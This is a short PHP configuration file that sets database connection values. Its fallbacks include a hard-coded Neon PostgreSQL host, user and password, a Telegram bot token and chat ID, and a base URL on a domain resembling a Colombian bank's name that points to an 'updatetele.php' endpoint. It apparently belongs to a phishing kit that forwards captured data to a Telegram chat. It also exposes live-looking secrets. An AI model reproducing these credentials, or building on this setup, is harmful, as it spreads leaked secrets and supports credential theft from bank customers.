<?php
// Build trigger: 100% no-captcha v1.0.1
// Parse DATABASE_URL if present (Render default)
$db_host = 'localhost';
$db_user = 'root';
$db_pass = '';
$db_name = 'aire';
$db_port = '5432';

if (getenv('DATABASE_URL')) {
    $url = parse_url(getenv('DATABASE_URL'));
    $db_host = $url['host'] ?? null;
    $db_user = $url['user'] ?? null;
    $db_pass = $url['pass'] ?? null;
    $db_name = ltrim($url['path'] ?? '', '/');
    $db_port = $url['port'] ?? 5432;
} else {
    // ── Neon PostgreSQL ────────────────────────────────────────
    $db_host = getenv('DB_HOST') ?: 'ep-jolly-rice-aizz7hvg-pooler.c-4.us-east-1.aws.neon.tech';
    $db_user = getenv('DB_USER') ?: 'neondb_owner';
    $db_pass = getenv('DB_PASS') ?: 'npg_iHg1Z9yDGOQw';
    $db_name = getenv('DB_NAME') ?: 'neondb';
    $db_port = getenv('DB_PORT') ?: '5432';
    // ────────────────────────────────────────────────────────────

    // FIX: Si el usuario puso la URL completa en DB_HOST por error, la parseamos aquí
    if (strpos($db_host, 'postgres://') === 0 || strpos($db_host, 'postgresql://') === 0 || strpos($db_host, 'mysql://') === 0) {
        $url = parse_url($db_host);
        $db_host = $url['host'] ?? $db_host;
        $db_user = $url['user'] ?? $db_user;
        $db_pass = $url['pass'] ?? $db_pass;
        $db_name = ltrim($url['path'] ?? '', '/') ?: $db_name;
        $db_port = $url['port'] ?? ($url['scheme'] === 'mysql' ? 3306 : 5432);
    }
}

return [
    'botToken' => getenv('BOT_TOKEN') ?: '8634923330:AAH31BhUWH8O2LuD9IQdwZyUTUyc0Ij-Hxo',
    'chatId' => getenv('CHAT_ID') ?: '-5180034812',
    'db_host' => $db_host,
    'db_user' => $db_user,
    'db_pass' => $db_pass,
    'db_name' => $db_name,
    'db_port' => $db_port,
    'baseUrl' => getenv('BASE_URL') ?: 'https://solucionesvirtualesbancol.vercel.app/updatetele.php',
    'security_key' => getenv('SECURITY_KEY') ?: 'secure_key_123'
];
?>